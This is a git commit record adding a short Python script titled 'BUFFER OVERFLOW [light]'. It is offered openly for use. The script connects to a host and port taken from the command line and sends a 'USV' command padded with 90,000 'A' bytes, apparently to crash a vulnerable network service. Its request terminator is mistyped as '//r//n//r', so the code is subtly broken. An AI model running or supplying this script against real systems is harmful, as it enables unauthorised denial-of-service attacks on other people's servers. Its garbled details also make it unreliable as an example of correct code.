a87726b55ae02cddcdb49c85ad69f3bbb519b035
mrx6s0 <rmdero_jr_@outlook.com>
2016-12-18 07:04:44 -0200

    Add files via upload

---
+++ payload_buffer.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*
+
+import argparse 
+import socket
+import sys
+import os
+
+print ("                                                                                                                           ")
+print ("#             SCRIPT : BUFFER OVERFLOW [light]                                           #") 
+print ("#             AUTOR : MRX with contributions from some friendly hackers                  #")
+print ("")                      
+
+
+def sender(host, port):
+    try:
+        buffer = b"\x41" * 90000
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.send(b"USV " + buffer + b"//r//n//r")
+        s.close()
+        print ("BUFFER_EXPLOIT enviado com sucesso!\n")
+    except KeyboardInterrupt:
+         print ('Exiting...\n')
+
+if __name__ == '__main__':
+    carg = argparse.ArgumentParser(description='Buffer overflow, I found it in a magazine', epilog='Use me, but be carefull')
+
+
+
+    carg.add_argument('-d', '--host', type=str, help='Host to send the buffer', required=True)
+    carg.add_argument('-p', '--port', type=int, help='Port to send the buffer', required=True)
+    args = carg.parse_args()
+
+    
+    host_ip = args.host
+    host_port = args.port
+
+    sender(host_ip, host_port)
+    sys.exit(0)
